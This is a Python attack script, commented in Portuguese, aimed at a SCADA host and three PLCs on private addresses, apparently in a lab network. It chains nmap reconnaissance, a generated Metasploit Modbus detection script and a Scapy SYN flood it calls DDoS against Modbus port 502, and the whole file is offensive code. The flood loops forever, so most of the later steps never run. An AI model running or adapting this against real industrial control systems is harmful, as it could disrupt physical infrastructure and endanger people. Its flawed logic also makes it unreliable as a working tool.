import os
import subprocess
from scapy.all import *

# Configurações de ataque
TARGET_SCADA_IP = "172.20.0.2"
TARGET_CLP_IPS = ["172.20.0.3", "172.20.0.4", "172.20.0.5"]
MODBUS_PORT = 502

# Diretório para armazenar os logs
LOG_DIR = "/logs"
os.makedirs(LOG_DIR, exist_ok=True)

def run_nmap(target):
    """Executa uma varredura Nmap no alvo especificado e salva o log."""
    log_file = os.path.join(LOG_DIR, f"nmap_{target}.log")
    print(f"Executando Nmap em {target}...")
    with open(log_file, 'w') as f:
        subprocess.run(["nmap", "-sV", target], stdout=f, stderr=subprocess.STDOUT)

def run_metasploit_modbus_attack(target):
    """Executa um ataque Metasploit no alvo especificado e salva o log."""
    log_file = os.path.join(LOG_DIR, f"metasploit_{target}.log")
    print(f"Executando ataque Metasploit Modbus em {target}...")
    metasploit_script = f"""
use auxiliary/scanner/scada/modbusdetect
set RHOSTS {target}
set RPORT {MODBUS_PORT}
run
exit
"""
    with open("metasploit_script.rc", "w") as f:
        f.write(metasploit_script)

    with open(log_file, 'w') as f:
        subprocess.run(["msfconsole", "-r", "metasploit_script.rc"], stdout=f, stderr=subprocess.STDOUT)

def run_ddos_attack(target):
    """Executa um ataque DDoS no alvo especificado e salva o log."""
    log_file = os.path.join(LOG_DIR, f"ddos_{target}.log")
    print(f"Executando ataque DDoS em {target}...")

    # Função simples de ataque DDoS com Scapy
    def flood(target_ip, log_file):
        packet = IP(dst=target_ip)/TCP(dport=[502, MODBUS_PORT], flags="S")
        send(packet, loop=1, verbose=0)
        with open(log_file, 'a') as f:
            f.write(f"Enviando pacotes para {target_ip}...\n")

    flood(target, log_file)

if __name__ == "__main__":
    # Reconhecimento com Nmap
    run_nmap(TARGET_SCADA_IP)
    for ip in TARGET_CLP_IPS:
        run_nmap(ip)

    # Ataque Modbus com Metasploit
    for ip in TARGET_CLP_IPS:
        run_metasploit_modbus_attack(ip)

    # Ataque DDoS
    run_ddos_attack(TARGET_SCADA_IP)
    for ip in TARGET_CLP_IPS:
        run_ddos_attack(ip)
